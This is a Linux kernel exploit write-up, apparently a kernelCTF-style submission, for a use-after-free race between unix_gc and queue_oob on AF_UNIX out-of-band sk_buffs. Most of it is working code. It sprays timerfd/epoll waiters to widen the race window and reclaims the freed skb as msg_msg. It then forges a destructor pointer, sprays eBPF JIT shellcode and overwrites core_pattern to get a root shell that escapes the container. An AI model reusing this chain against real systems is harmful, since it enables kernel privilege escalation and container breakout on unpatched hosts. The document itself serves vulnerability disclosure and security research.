# Vulnerability
unix_gc() tries to garbage-collect inflight sockets, and then if the socket has MSG_OOB in unix_sk(sk)->oob_skb, GC will drop the reference locklessly.  
It will cause race condition in unix_gc[1] while peer unix socket call queue_oob[2].

* unix_gc
```c
	skb_queue_head_init(&hitlist);
	list_for_each_entry(u, &gc_candidates, link) {
		scan_children(&u->sk, inc_inflight, &hitlist);

#if IS_ENABLED(CONFIG_AF_UNIX_OOB)
		if (u->oob_skb) {
			kfree_skb(u->oob_skb); //[1]
			u->oob_skb = NULL;
		}
#endif
	}

```

* queue_oob
```c
	if (ousk->oob_skb)
		consume_skb(ousk->oob_skb); //[2]

	WRITE_ONCE(ousk->oob_skb, skb);
```



# Exploit Tech Detail
The exploit is consist in the following steps
* Prepare timerfd to extend race window
* Prepare refcount circle to make unix_gc free victim unix_socket
* Race between unix_gc with queue_oob
* Reclaim SKB with msg_msg to control destructor
* Call kfree_skb to RIP Control
* Achieve container escape.

## Prepare timerfd to extend race window
We adopt the exploit tech from `Jann's blog Racing against the clock -- hitting a tiny kernel race window` to extend the race windows
To make race windows larger on kernels without CONFIG_PREEMPT.
* make a timerfd expire in that window (which will run in an interrupt handler - in other words, in hardirq context)
* make sure that the wakeup triggered by the timerfd has to churn through many waitqueue items created by epoll

So function `do_epoll_enqueue` in our exploit code is to do such thing
```C
void do_epoll_enqueue(int fd)
{
	int cfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < 0x4; k++)
	{
		if (fork() == 0)
		{
			for (int i = 0; i < 0x100; i++)
			{
				timefds[i] = SYSCHK(dup(fd));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				epfds[i] = SYSCHK(epoll_create(0x1));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				for (int j = 0; j < 0x100; j++)
				{
					// queue as many as possible async waiters at timerfd waitqueue
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], buf, 1);
			raise(SIGSTOP); // stop here for nothing and just keep epoll alive
		}
		// sync to make sure it has queue what we need
		read(cfd[0], buf, 1);
	}
	close(cfd[0]);
	close(cfd[1]);
}
```

## Race between unix_gc with queue_oob

sk_buff's refcount is named as users. When sk_buff will be freed if users==1 while calling kfree_skb.  
Unix socket oob_skb's users has two. One is for stored in unix_sock->oob_skb and another is for sock->sk_receive_queue.
We use two threads to cause race between unix_gc and queue_oob in the following condition.

Thread A                 		      | Thread B
----------------------------|------------------------------
queue_oob() // users == 2 <br> consume_skb() // users == 2 -> 1 | unix_gc()
<br> | if (u->oob_skb)  // users == 1 <br> kfree_skb(u->oob_skb) // free skb
WRITE_ONCE(ousk->oob_skb, skb) | 
<br> | unix_release_sock() <br> skb = skb_dequeue(&sk->sk_receive_queue) <br> kfree_skb(skb); // skb UAF

## Reclaim SKB with msg_msg to control destructor

sk_buff is under `skbuff_head_cache` with size `0xe0`
```
gefâž¤  p sizeof(struct sk_buff)
$1 = 0xe0
```
With cross-cache tech, we can reclaim victim skb as msg_msg which is under `kmalloc-cg-256` cache like following example code.

* Allocate a lot skbs between victim
```c
		// Allocate some sk_buff before oob_skb
		for (int i = 0; i < 0x200; i++)
			SYSCHK(send(datafd[1], buf, 1, 0));

		SYSCHK(send(victim_fd[1], buf, 1, MSG_OOB));

		// Allocate some sk_buff after oob_skb
		for (int i = 0; i < 0x200; i++)
			SYSCHK(send(datafd[0], buf, 1, 0));

```

* Free them all and reclaim as msg_msg
```c
		// free all skbs
		for (int i = 0; i < 0x200; i++)
			SYSCHK(recv(datafd[0], buf, 1, 0));

		// free all skbs
		for (int i = 0; i < 0x200; i++)
			SYSCHK(recv(datafd[1], buf, 1, 0));

		// cross-cache to reclaim oob_skb as msg_msg
		for (int i = 0; i < 0x1000; i++)
			SYSCHK(msgsnd(msqid[i], &msg, 0x100 - 0x30, 0));
```

* Forge skb to make users equal to one and destructor as the address we want to jump to

```c
	char *skb = (void *)&msg.mtext[-0x30];

	// struct sk_buff {
	//     void       (*destructor)(struct sk_buff *); /*    96     8 */
	//     refcount_t                 users;                /*   220     4 */
#define OFFSET_SKB_DESTRUCTOR 96
#define OFFSET_SKB_USERS 220
	*(size_t *)(skb + OFFSET_SKB_DESTRUCTOR) = 0xffffffffcc000000 - 0x800;
	*(unsigned *)(skb + OFFSET_SKB_USERS) = 1;
```

## RIP Control
We set `skb->destructor` to guessed ebpf JIT address.

```c
void skb_release_head_state(struct sk_buff *skb)
{
	skb_dst_drop(skb);
	if (skb->destructor) {
		DEBUG_NET_WARN_ON_ONCE(in_hardirq());
		skb->destructor(skb);
	}
```


## Achieve container escape
### Spray eBPF programs
Our goal is to do some eBPF JIT spraying so later when we control kernel RIP, it will jump to the JIT page and execute our shellcode.

Linux kernel provide a socket option `SO_ATTACH_FILTER` and let user to attach a classic BPF program to the socket for use as a filter of incoming packets.

By creating lots of sockets and attach to classic BPF program, we can spray a lot of eBPF programs in kernel.
```cpp
    struct sock_fprog prog = {
        .len =  TSIZE,
        .filter = filter,
    };
    for(int i=0;i<NUM;i++){
        int fd[2];
        SYSCHK(socketpair(AF_UNIX,SOCK_DGRAM,0,fd));
        SYSCHK(setsockopt(fd[0],SOL_SOCKET,26,&prog,sizeof(prog)));
    }
```

As for the shellcode in our eBPF program, our goal is to overwrite  `/proc/sys/kernel/core_pattern` so later we can execute command as root by triggering crash. Here's what our shellcode did to achieve our goal:
* Use the `rdmsr` instruction to obtain the kernel text address. With RCX being set to MSR_LSTAR ( `0xc0000082` ), we'll be able to obtain the address of `entry_SYSCALL_64`.
* Calculate the address of `core_pattern` and `_copy_from_user`.
* Call `_copy_from_user(core_pattern, user_buf, 0x30);`, where `user_buf` is a buffer in user space that stores the content we want to overwrite in `core_pattern`. 

We construct our eBPF program with the following form:

```cpp
struct sock_filter table[] = {
        {.code = BPF_LD + BPF_K, .k = 0xb3909090},
        {.code = BPF_LD + BPF_K, .k = 0xb3909090},
        .....................
};
```

The above example will be compiled into the following instructions after JIT:

```
b8 90 90 90 b3    mov eax, 0xb3909090
b8 90 90 90 b3    mov eax, 0xb3909090
```

If we can control kernel RIP to jump into the NOP instruction ( 0x90 ), the code will become:

```
90       nop 
b3 b8    mov    bl, 0xb8
90       nop
90       nop
90       nop
b3 b8    mov    bl, 0xb8
....
```

We can see that by using an extra byte `0xb3`, we can skip the useless byte `0xb8` and execute our own shellcode. Notice that due to the "skipping part", we only have 3 bytes of space in each instruction, so we'll have to take care of that as well during our shellcode construction.

### Post RIP

Once we control the kernel RIP and jump into the middle of our eBPF program, the shellcode we crafted will cause core_pattern being overwritten to `|/proc/%P/fd/666 %P`:

We then use memfd and write an executable file payload in fd 666.
```C
int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}
```

Later when coredump happened, it will execute our executable file as root in root namespace:
```C
*(size_t*)0=0; //trigger coredump
```

Spawn shell when coredump happened. This is the code looks like:
```c++
int main(int argc, char **argv)
{
        if (argc > 1)
        {
			// #define SYS_pidfd_getfd 438
			int pid = strtoull(argv[1], 0, 10);
			int pfd = syscall(SYS_pidfd_open, pid, 0);
			int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
			int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
			int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
			dup2(stdinfd, 0);
			dup2(stdoutfd, 1);
			dup2(stderrfd, 2);
			/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
			system("cat /flag;echo o>/proc/sysrq-trigger");
			execlp("bash", "bash", NULL);
		}
```
